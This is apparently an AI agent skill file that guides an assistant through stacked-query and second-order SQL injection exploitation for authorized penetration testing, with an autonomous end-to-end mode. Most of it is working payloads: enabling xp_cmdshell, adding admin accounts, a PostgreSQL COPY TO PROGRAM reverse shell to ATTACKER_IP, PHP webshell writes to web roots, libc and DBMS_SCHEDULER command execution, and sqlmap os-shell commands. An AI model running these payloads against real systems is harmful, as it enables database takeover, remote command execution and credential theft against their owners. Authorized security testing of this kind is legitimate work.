---
name: sql-injection-stacked
description: >
  Guide stacked query SQL injection and second-order injection exploitation
  during authorized penetration testing. Use when the user needs to execute
  arbitrary SQL statements (INSERT, UPDATE, DELETE, command execution) via
  semicolons, or when a stored payload triggers in a different query context.
  Also triggers on: "stacked queries", "multi-statement injection",
  "xp_cmdshell", "COPY TO PROGRAM", "command execution via SQL", "second-order
  SQLi", "stored injection", "data modification via SQLi", "write webshell SQL",
  "OS command from database". OPSEC: high — modifies data, enables command
  execution, triggers DBA alerts and EDR. Tools: sqlmap, burpsuite.
  Do NOT use for read-only data extraction — use sql-injection-union,
  sql-injection-error, or sql-injection-blind instead.
---

# Stacked Queries & Second-Order SQL Injection

You are helping a penetration tester exploit stacked query SQL injection
(executing multiple SQL statements via semicolons) and second-order injection
(stored payloads that trigger in a different query context). These are the
gateway to data manipulation, command execution, and file operations. All
testing is under explicit written authorization.

## Mode

Check if the user or orchestrator has set a mode:
- **Guided** (default): Before executing any command that sends traffic to a
  target, present the command with a one-line explanation of what it does and
  why. Wait for explicit user approval before executing. Never batch multiple
  target-touching commands without approval — present them one at a time (or as
  a small logical group if they achieve a single objective, e.g., "enumerate SMB
  shares"). Local-only operations (file writes, output parsing, engagement
  logging, hash cracking) do not require approval. At decision forks, present
  options and let the user choose.
- **Autonomous**: Execute end-to-end. Auto-detect stacking support, escalate to
  command execution where possible. Report at milestones. **Always pause before**:
  enabling xp_cmdshell, writing webshells, modifying production data, or
  executing OS commands.

If unclear, default to guided.

## Engagement Logging

Check for `./engagement/` directory. If absent:
- **Guided**: Ask if the user wants to initialize an engagement directory.
- **Autonomous**: Create it automatically with `activity.md`, `findings.md`, and
  `evidence/`.

When an engagement directory exists, log as you work:
- **Activity** → append to `engagement/activity.md` at milestones (test confirmed,
  data extracted, finding discovered, pivot to another skill):
  `### [HH:MM] sql-injection-stacked → <target>` with bullet points of actions/results.
- **Findings** → append to `engagement/findings.md` when a vulnerability is confirmed:
  `## N. Title [Severity]` with target, technique, impact, evidence path, repro command.
- **Evidence** → save significant output to `engagement/evidence/` with descriptive
  filenames (e.g., `sqli-stacked-data-exfil.txt`).

If no engagement directory exists and the user declines to create one, proceed normally.

### Invocation Log

Immediately on activation — before reading state.md or doing any assessment —
log invocation to both the screen and activity.md:

1. **On-screen**: Print `[sql-injection-stacked] Activated → <target>` so the operator
   sees which skill is running.
2. **activity.md**: Append:
   ```
   ### [HH:MM] sql-injection-stacked → <target>
   - Invoked (assessment starting)
   ```

**Timestamps:** Replace `[HH:MM]` with the actual current time. Run
`date +%H:%M` to get it. Never write the literal placeholder `[HH:MM]` —
activity.md entries need real timestamps for timeline reconstruction.

This entry must be written NOW, not deferred. Subsequent milestone entries
append bullet points under this same header.


## State Management

If `engagement/state.md` exists, read it before starting. Use it to:
- Skip re-testing targets, parameters, or vulns already confirmed
- Leverage existing credentials or access for this technique
- Understand what's been tried and failed (check Blocked section)

Write `engagement/state.md` at these checkpoints (not just at completion):
1. **After confirming a vulnerability** — add to Vulns with `[found]`
2. **After successful exploitation** — add credentials, access, pivot paths
3. **Before routing to another skill** — the next skill reads state.md on activation

At each checkpoint and on completion, update the relevant sections of
`engagement/state.md`:
- **Targets**: Add any new hosts, URLs, or services discovered
- **Credentials**: Add any credentials, tokens, or keys recovered
- **Access**: Add or update footholds (shells, sessions, DB access)
- **Vulns**: Add confirmed vulns as one-liners; mark exploited ones `[done]`
- **Pivot Map**: Add new attack paths discovered (X leads to Y)
- **Blocked**: Record what was tried and why it failed

Keep entries compact — one line per item. State.md is a snapshot, not a log.

## Prerequisites

- Confirmed SQL injection point (see **web-discovery**)
- For stacked queries: DB and driver that supports multi-statement execution
- For second-order: ability to store input that is later used unsafely

### Database Support Matrix

| Feature | MSSQL | PostgreSQL | MySQL | Oracle | SQLite |
|---------|-------|------------|-------|--------|--------|
| Stacked queries (`;`) | Yes | Yes | No (default) | Limited | No |
| Command execution | xp_cmdshell | COPY TO PROGRAM | UDF / INTO OUTFILE | Java / DBMS_SCHEDULER | No |
| WAF bypass stacking | Yes (no `;` needed) | Limited | PREPARE/EXECUTE | N/A | N/A |

**MySQL caveat:** Stacking only works with `mysqli.multi_query()` or
`PDO::ATTR_EMULATE_PREPARES => true`.

## Step 1: Assess

If not already provided, determine:
1. **Injection point** — URL, parameter name, request method
2. **DBMS** — critical for selecting the right stacking technique
3. **Current DB privileges** — sysadmin/superuser enables command execution

Skip if context was already provided.

## Step 2: Confirm Stacking Support

```sql
-- No-op stacked query — no error means stacking is supported
'; SELECT 1--+

-- Time-based confirmation
'; WAITFOR DELAY '0:0:3'--+          -- MSSQL
'; SELECT pg_sleep(3)--+             -- PostgreSQL
```

If `;` causes an error but other injection works, stacking is not supported — use read-only techniques instead.

## Step 3: Exploit — Stacked Queries

### MSSQL

MSSQL has the richest stacking support. Semicolons are optional.

**Data manipulation:**
```sql
'; INSERT INTO users (username, password, role) VALUES ('hacker','Passw0rd!','admin')--+
'; UPDATE users SET password='Passw0rd!' WHERE username='admin'--+
```

**Enable and execute xp_cmdshell:**
```sql
-- Enable (disabled by default in SQL Server 2005+)
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE--+

-- Execute OS commands
'; EXEC xp_cmdshell 'whoami'--+
'; EXEC xp_cmdshell 'net user hacker Passw0rd! /add'--+
'; EXEC xp_cmdshell 'powershell -e JABjAGwAaQBl...'--+
```

**WAF bypass — stacking without semicolons:**
```sql
admin'exec('update[users]set[password]=''a''')--
admin'exec('sp_configure''show advanced option'',''1''reconfigure')exec('sp_configure''xp_cmdshell'',''1''reconfigure')--
```

**OLE Automation** (alternative to xp_cmdshell):
```sql
'; DECLARE @s INT; EXEC sp_oacreate 'wscript.shell',@s OUT; EXEC sp_oamethod @s,'run',NULL,'cmd /c whoami > C:\temp\out.txt'--+
```

### PostgreSQL

Full stacking support via semicolons.

**Data manipulation:**
```sql
'; INSERT INTO users (username, password) VALUES ('hacker','Passw0rd!')--+
'; UPDATE users SET password='Passw0rd!' WHERE username='admin'--+
'; CREATE TABLE exfil (data text)--+
```

**Command execution via COPY TO PROGRAM** (requires superuser or `pg_execute_server_program`):
```sql
'; COPY (SELECT '') TO PROGRAM 'id > /tmp/out.txt'--+
'; COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"'--+
```

**Command execution via custom function (libc):**
```sql
'; CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6','system' LANGUAGE 'c' STRICT--+
'; SELECT system('id')--+
```

**File operations:**
```sql
'; CREATE TABLE fileread (content text); COPY fileread FROM '/etc/passwd'--+
'; COPY (SELECT '<?php system($_GET["c"]); ?>') TO '/var/www/html/cmd.php'--+
```

### MySQL (When Stacking Is Possible)

**PREPARE/EXECUTE workaround** (bypasses keyword filters):
```sql
0); SET @query = 0x53454c45435420534c454550283529; PREPARE stmt FROM @query; EXECUTE stmt; #
-- 0x53454c45435420534c454550283529 = "SELECT SLEEP(5)"
```

**INSERT with ON DUPLICATE KEY UPDATE** (no stacking required):
```sql
-- Injected into INSERT VALUES clause:
attacker@evil.com"), ("admin@target.com","Passw0rd!") ON DUPLICATE KEY UPDATE password="Passw0rd!" #
```

**File write** (no stacking required):
```sql
' UNION SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'--+
```

### Oracle

Limited stacking — primarily PL/SQL blocks.

**Command execution via DBMS_SCHEDULER:**
```sql
'; BEGIN DBMS_SCHEDULER.CREATE_JOB(job_name=>'pwn',job_type=>'EXECUTABLE',job_action=>'/bin/bash',number_of_arguments=>2,enabled=>FALSE); DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('pwn',1,'-c'); DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('pwn',2,'id > /tmp/out.txt'); DBMS_SCHEDULER.ENABLE('pwn'); END;--+
```

**Command execution via Java:**
```sql
'; SELECT DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','/bin/bash','-c','id > /tmp/out.txt') FROM dual--+
```

## Step 4: Exploit — Second-Order Injection

Second-order SQLi occurs when input is stored safely (escaped on INSERT) but
used unsafely in a later query.

### Attack Flow

```
1. STORE: Register with username = admin'--
   -> INSERT INTO users (username) VALUES ('admin''--')  <- properly escaped

2. TRIGGER: App reads stored value into a different query:
   -> query = "SELECT * FROM orders WHERE username = '" + user_from_db + "'"
   -> SELECT * FROM orders WHERE username = 'admin'--'   <- injection fires
```

### Common Vectors

| Store Location | Trigger Location |
|---|---|
| Registration username/email | Profile page, admin user list, password reset |
| Forum post / comment | Notification email, search index, RSS feed |
| File upload filename | File listing page, download handler |
| Address / shipping info | Invoice generation, CSV/PDF export |

### Testing Methodology

1. **Identify store points** — any form where input is saved
2. **Inject markers**: `admin'--`, `admin' OR '1'='1`, `admin' UNION SELECT 1,2,3--`
3. **Map trigger points** — navigate to every page that reads stored data
4. **Monitor for anomalies** — SQL errors, missing content, extra results
5. **Confirm with targeted payload** — craft extraction payload for the trigger context

### sqlmap for Second-Order

```bash
sqlmap -r register.txt -p username --second-url "http://TARGET/profile.php"
sqlmap -r register.txt -p username --second-req profile-request.txt
```

## Step 5: Post-Exploitation

1. **Enumerate privileges** — confirm DBA/superuser before command execution
2. **Command execution** — use DBMS-appropriate method (see Step 3)
3. **File operations** — read configs, write webshells
4. **Data manipulation** — insert admin users, modify application state
5. **Credential harvest** — database config files may contain creds for other systems

## Step 6: Escalate or Pivot

**Before routing**: Write `engagement/state.md` and append to
`engagement/activity.md` with results so far. The next skill reads state.md
on activation — stale state means duplicate work or missed context.

- **Read-only extraction needed**: Route to **sql-injection-union**, **sql-injection-error**, or **sql-injection-blind**
- **Got OS command execution**: Enumerate host, check for pivoting opportunities
- **Extracted credentials**: Test against other services, document findings

Update `engagement/state.md` with any new credentials, access, vulns, or pivot paths discovered.

When routing, pass along: injection point, DBMS, stacking confirmation, current mode, privileges confirmed.

## OPSEC Notes

- **High risk**: Stacked queries modify data and trigger DBA alerts
- **Cleanup is critical** — revert data changes, drop created objects, disable re-enabled features:
  ```sql
  EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;
  EXEC sp_configure 'show advanced options', 0; RECONFIGURE;
  ```
- Document exact changes (table, column, old value, new value) for restoration
- xp_cmdshell, sp_configure, COPY TO PROGRAM all appear in audit logs
- New database objects created by the web app user are anomalous

## Troubleshooting

### Stacked Queries Fail on MySQL
MySQL blocks stacking by default. Alternatives:
- `ON DUPLICATE KEY UPDATE` for INSERT injection (no stacking needed)
- `SELECT INTO OUTFILE` for file write (no stacking needed)
- Check if app uses `multi_query()` or PDO emulated prepares
- If none apply, stacking is not possible — use other techniques

### xp_cmdshell Access Denied
```sql
-- Check if sysadmin
SELECT IS_SRVROLEMEMBER('sysadmin')

-- Try impersonation
EXECUTE AS LOGIN = 'sa'; EXEC xp_cmdshell 'whoami'; REVERT;

-- Try OLE automation as alternative
EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;
```

### COPY TO PROGRAM Permission Denied
```sql
-- Check if superuser
SELECT current_setting('is_superuser');

-- Check for pg_execute_server_program role (PostgreSQL 11+)
SELECT rolname FROM pg_roles WHERE pg_has_role(current_user, oid, 'member') AND rolname = 'pg_execute_server_program';

-- Alternative: write to web root
COPY (SELECT '<?php system($_GET["c"]); ?>') TO '/var/www/html/cmd.php';
```

### Second-Order Payload Not Triggering
- Stored value may be HTML-encoded, truncated, or transformed
- Try different quote contexts: `admin'--`, `admin"--`, `` admin`-- ``
- Check if trigger uses stored value directly or a derived value (e.g., user ID)
- Use Burp to intercept trigger request and inspect how stored value is embedded

### Automated Exploitation with sqlmap
```bash
# Stacked queries technique only
sqlmap -u "https://TARGET/page?id=1" --batch --technique=S --dbs

# OS shell (auto-selects xp_cmdshell or COPY TO PROGRAM)
sqlmap -u "https://TARGET/page?id=1" --batch --os-shell

# SQL shell for manual stacked execution
sqlmap -u "https://TARGET/page?id=1" --batch --sql-shell

# Second-order
sqlmap -r store-request.txt -p username --second-url "http://TARGET/trigger"
```
